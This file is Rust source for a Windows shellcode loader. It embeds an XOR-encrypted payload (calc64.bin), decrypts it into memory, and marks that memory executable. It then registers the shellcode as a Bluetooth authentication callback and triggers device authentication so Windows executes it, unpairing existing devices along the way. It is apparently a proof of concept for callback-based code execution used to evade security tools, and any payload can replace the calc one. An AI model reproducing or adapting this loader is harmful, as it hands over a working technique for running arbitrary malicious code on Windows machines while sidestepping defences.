use std::{ffi::c_void, mem, ptr};

use windows::{core::{Error, PWSTR}, Win32::{Devices::Bluetooth::{BluetoothAuthenticateDevice, BluetoothFindDeviceClose, BluetoothFindFirstDevice, BluetoothFindFirstRadio, BluetoothFindRadioClose, BluetoothGetRadioInfo, BluetoothRegisterForAuthenticationEx, BluetoothRemoveDevice, BluetoothUnregisterAuthentication, BLUETOOTH_AUTHENTICATION_CALLBACK_PARAMS, BLUETOOTH_DEVICE_INFO, BLUETOOTH_DEVICE_SEARCH_PARAMS, BLUETOOTH_FIND_RADIO_PARAMS, BLUETOOTH_RADIO_INFO, HBLUETOOTH_DEVICE_FIND, HBLUETOOTH_RADIO_FIND}, Foundation::{BOOL, HANDLE, HWND}, System::Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE}}};

// fn breakpoint() {
//     println!("[!] BP HIT");
//     let mut buf: String = String::new();
//     std::io::stdin().read_line(&mut buf).unwrap();
// }

fn xdec(data: Vec<u8>) -> Vec<u8> {
    let key: Vec<u8> = vec![0x74, 0x65, 0x73, 0x74, 0x69, 0x6e, 0x67]; // testing
    let mut buf: Vec<u8> = Vec::new();
    let mut j: usize = 0;
    for i in 0..data.len() {
        if j > key.len() -1 {
            j = 0;
        }
        buf.push(data[i] ^ key[j]);
        j = j + 1;
    }
    return buf;
}

fn load_payload() -> *mut c_void {
    unsafe {
        let mut sc: Vec<u8> = include_bytes!("calc64.bin").to_vec().to_owned();
        let sc_len: usize = sc.len();

        println!("[*] Allocating memory for shellcode");
        let mem_addr: *mut c_void = VirtualAlloc(Some(ptr::null_mut()), sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        println!("[+] Memory allocated at {:?}", mem_addr);

        println!("[*] Decrypting shellcode");
        let mut d_data: Vec<u8> = xdec(sc);

        println!("[*] Copying shellcode into memory");
        ptr::copy(d_data.as_mut_ptr() as *mut c_void, mem_addr, sc_len);

        println!("[+] {sc_len} bytes copied");

        let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS::default();
        println!("[*] Changing memory protections");
        VirtualProtect(mem_addr, sc_len, PAGE_EXECUTE_READ, &mut old_protect).unwrap();

        return mem_addr;
    }
}

fn find_device() -> Result<BLUETOOTH_DEVICE_INFO, Error> {
    unsafe {
        let mut pbstp: BLUETOOTH_DEVICE_SEARCH_PARAMS = BLUETOOTH_DEVICE_SEARCH_PARAMS::default();
        pbstp.dwSize = mem::size_of::<BLUETOOTH_DEVICE_SEARCH_PARAMS>() as u32;
        pbstp.fReturnUnknown = BOOL(1);
        pbstp.fReturnAuthenticated = BOOL(1);
        pbstp.fReturnRemembered = BOOL(1);
        pbstp.fReturnConnected = BOOL(1);
        pbstp.fIssueInquiry = BOOL(1);
        pbstp.cTimeoutMultiplier = 10;

        let mut pbtdi: BLUETOOTH_DEVICE_INFO = BLUETOOTH_DEVICE_INFO::default();
        pbtdi.dwSize = mem::size_of::<BLUETOOTH_DEVICE_INFO>() as u32;

        println!("[*] Searching for Bluetooth devices");
        let bd_handle: HBLUETOOTH_DEVICE_FIND  = BluetoothFindFirstDevice(&mut pbstp, &mut pbtdi).unwrap();

        let d_name: PWSTR = PWSTR::from_raw(pbtdi.szName.as_mut_ptr());
        
        println!("[+] Device found!");
        println!("> Name: {:?}", d_name.to_string().unwrap());
        println!("> Connected: {:?}", pbtdi.fConnected.as_bool());
        println!("> Authenticated: {:?}", pbtdi.fAuthenticated.as_bool());
        println!("> Remembered: {:?}", pbtdi.fRemembered.as_bool());

        let raw_addr: [u8; 6] = pbtdi.Address.Anonymous.rgBytes;
        let formatted_addr: Vec<String> = raw_addr.iter().rev().map(|byte| format!("{:02X}", byte)).collect();
        println!("> Device Address: {:?}", formatted_addr.join(":"));

        BluetoothFindDeviceClose(bd_handle).unwrap();

        if pbtdi.fAuthenticated.as_bool() {
            println!("[+] Device is already authenticated...removing");
            let res: u32 = BluetoothRemoveDevice(&pbtdi.Address);
            if res == 0 {
                println!("[+] Device removed OK!");
                // need to re run after removing and hopefully get something else
                return find_device();
            }
        }

        Ok(pbtdi)
    }
}

fn main() {
    unsafe {
        println!("[*] Searching for Radios");
        let mut pbtfrp: BLUETOOTH_FIND_RADIO_PARAMS = BLUETOOTH_FIND_RADIO_PARAMS::default();
        pbtfrp.dwSize = mem::size_of::<BLUETOOTH_FIND_RADIO_PARAMS>() as u32;

        let mut phradio: HANDLE = HANDLE::default();
        let br_result: Result<HBLUETOOTH_RADIO_FIND, Error> = BluetoothFindFirstRadio(&mut pbtfrp, &mut phradio);

        if br_result.is_err() {
            println!("[!] No radio found!");
            return;
        }

        let br_handle: HBLUETOOTH_RADIO_FIND = br_result.unwrap();

        let mut radio_info: BLUETOOTH_RADIO_INFO = BLUETOOTH_RADIO_INFO::default();
        radio_info.dwSize = mem::size_of::<BLUETOOTH_RADIO_INFO>() as u32;
        let res: u32 = BluetoothGetRadioInfo(phradio, &mut radio_info);

        if res == 0 {
            let r_name: PWSTR = PWSTR::from_raw(radio_info.szName.as_mut_ptr());
            println!("[+] Radio found!");
            println!("> Name: {:?}", r_name.to_string().unwrap());

            BluetoothFindRadioClose(br_handle).unwrap();
        }

        let device_search_res: Result<BLUETOOTH_DEVICE_INFO, Error> = find_device();

        if device_search_res.is_err() {
            println!("[!] No devices found!");
            return;
        }

        let mut device_info: BLUETOOTH_DEVICE_INFO = device_search_res.unwrap();

        println!("[*] Preparing payload");
        let mem_addr: *mut c_void = load_payload();

        println!("[*] Registering callback for Bluetooth device authentication request");

        let mut phreghandle: isize = 0;

        let cb: unsafe extern "system" fn (*const c_void, * const BLUETOOTH_AUTHENTICATION_CALLBACK_PARAMS) -> BOOL = { mem::transmute(mem_addr) };

        let auth_register: u32 = BluetoothRegisterForAuthenticationEx(Some(&mut device_info), &mut phreghandle, Some(cb), Some(ptr::null_mut()));

        println!("[+] Auth registration response - {auth_register}");
        if auth_register == 0 {
            println!("[+] Callback registered OK!");
        }

        println!("[*] Triggering device authentication");
        let bt_auth: u32 = BluetoothAuthenticateDevice(HWND::default(), phradio, &mut device_info, Some(&[0x00]));

        println!("[+] BT Auth response - {bt_auth}");

        BluetoothUnregisterAuthentication(phreghandle).unwrap();

    }
}
